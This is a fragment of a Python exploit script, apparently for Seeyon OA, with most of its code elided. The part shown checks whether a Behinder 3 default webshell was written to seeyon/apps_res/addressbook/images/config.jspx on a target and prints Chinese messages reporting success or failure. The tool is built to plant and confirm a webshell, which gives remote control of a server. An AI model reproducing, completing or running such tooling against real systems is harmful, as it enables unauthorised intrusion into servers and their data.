...
def main(target_url):
    ...
    # print(now_time() + " [INFO]     正在请求: {}".format(vuln_url_2), style='bold blue')
    headers = {
...
def test_webshell(target_url):
    ...
    try:
        ...
        '''print(now_time() + " [INFO]     正在请求: {}seeyon/apps_res/addressbook/images/config.jspx".format(
            target_url), style='bold blue')'''
        if response.status_code == 200:
            print(
                now_time() + ' [SUCCESS]  成功上传冰蝎三默认webshell: {}seeyon/apps_res/addressbook/images/config.jspx'.format(
                    target_url, target_url))
        else:
            print(now_time() + " [WARNING]  目标漏洞无法利用, 写入失败 ")
    except:
        print(now_time() + " [WARNING]  目标漏洞无法利用, 写入失败 ")
